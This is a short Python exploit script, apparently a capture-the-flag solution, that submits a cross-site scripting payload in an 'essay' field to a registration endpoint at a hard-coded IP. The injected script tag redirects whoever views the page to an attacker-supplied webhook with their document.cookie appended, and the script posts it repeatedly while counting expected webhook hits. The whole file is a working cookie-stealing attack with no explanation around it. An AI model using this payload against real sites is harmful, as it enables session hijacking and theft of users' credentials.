import requests as r 
url = input("Add you webhook URL\n")

data= {
    "email":"hellobozo@gmail.com",
    "essay":""
}
data['essay']="""<script id='debug' src="/static/js/thing.js" data-iloveumass="hi');document.location=
'"""+url+"""?value='%2Bdocument.cookie;//"></script>"""
print(data['essay'])
#or whatever ip ur hosting this on
counter = 0
for i in range(1,150):
    r1 = r.get("http://34.71.12.5:6942")
    if(i%5==0):
        r1=r.post("http://34.71.12.5:6942/register",data=data)
        counter = counter+1
        print(r1.text)

print(f"Expecting {counter} webhook hits")